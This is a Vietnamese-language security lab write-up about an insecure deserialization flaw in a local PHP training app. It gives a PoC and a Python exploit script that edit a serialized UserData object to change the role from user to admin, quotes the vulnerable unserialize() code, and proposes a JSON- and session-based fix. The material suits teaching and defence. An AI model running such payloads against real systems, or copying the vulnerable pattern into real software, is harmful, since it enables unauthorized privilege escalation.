1. Insecure Deserialization

URL: `http://127.0.0.1/OhMyCrab/modules/insecure_deserialization/form.php`

Ứng dụng tồn tại lỗ hổng Insecure Deserialization do thực hiện deserialize dữ liệu người dùng cung cấp thông qua hàm unserialize() mà không kiểm tra integrity hoặc giới hạn object được phép khởi tạo. Ứng dụng tạo serialized data chứa thông tin người dùng hiện tại (username, role) và hiển thị ra giao diện. Attacker có thể chỉnh sửa serialized data trước khi gửi lại server nhằm thay đổi thuộc tính của object.Trong trường hợp này, attacker có thể sửa giá trị role từ user thành admin, dẫn đến leo thang đặc quyền.

PoC

- Truy cập chức năng Insecure Deserialization.

- Ứng dụng hiển thị serialized data hiện tại: `O:8:"UserData":2:{s:8:"username";s:6:"caymai";s:4:"role";s:4:"user";}`

Thay đổi giá trị: `"role";s:4:"user"` thành `"role";s:5:"admin"`

- Nhập payload sau khi chỉnh sửa `O:8:"UserData":2:{s:8:"username";s:6:"caymai";s:4:"role";s:5:"admin";}`,nhấn nút deserialize và quan sát kết quả trả về.

<img width="685" height="572" alt="image" src="https://github.com/user-attachments/assets/2130a6b3-b0b2-4832-8d1e-98482ca29130" />

-> Attacker có thể sửa đổi thuộc tính của object và thực hiện việc leo thang đặc quyền.

Phân tích source code

```
class UserData
{
    public $username;
    public $role;

    public function __construct($username = "guest", $role = "user") {
        $this->username = $username;
        $this->role = $role;
    }

    function __destruct()
    {
        if ($this->role === "admin") {
            echo "<p style='color:lime'>Đã thay đổi quyền từ user sang admin</p>";
        }
    }
}
$currentUserObject = new UserData($current_username, $current_role);
$current_serialized_data = serialize($currentUserObject);
$payload = $_POST['payload'];
$unserialized_obj = @unserialize($payload);
```

- Serialized data chứa thông tin quyền người dùng, được hiển thị cho người dùng và có thể bị chỉnh sửa.

- Dữ liệu attacker kiểm soát được đưa trực tiếp vào: `unserialize()`.

- Attacker có thể sửa thuộc tính trong serialized data để thay đổi logic ứng dụng.

- Sau khi deserialize, magic method `__destruct()` được gọi tự động và thực thi logic cấp quyền admin.

Cách khắc phục

```
$currentUserData = [
    "username" => $current_username,
    "role" => $current_role
];

$current_json_data = json_encode($currentUserData);

$data = json_decode($payload, true);
```

- Ứng dụng không còn deserialize dữ liệu người dùng bằng PHP serialization. Dữ liệu JSON sau khi parse chỉ tồn tại dưới dạng: array, scalar value. Logic phân quyền được kiểm tra từ session phía server thay vì dữ liệu do client kiểm soát, loại bỏ hoàn toàn khả năng khai thác insecure deserialization để thay đổi role từ user sang admin.

Script khai thác

```
import requests

url = "http://127.0.0.1/OhMyCrab/modules/insecure_deserialization/form.php"
payload = 'O:8:"UserData":2:{s:8:"username";s:5:"guest";s:4:"role";s:5:"admin";}'
data = {
    "payload": payload
}
response = requests.post(url, data=data)
if "Đã thay đổi quyền từ user sang admin" in response.text:
    print("Đã thay đổi quyền từ user sang admin.")
    print("Khai thác lỗ hổng Insecure Deserialization thành công!")
else:
    print("Khai thác thất bại")
```

Script được sử dụng để tự động gửi serialized object đã bị chỉnh sửa tới ứng dụng nhằm thay đổi thuộc tính role từ user thành admin và khai thác lỗ hổng insecure deserialization.
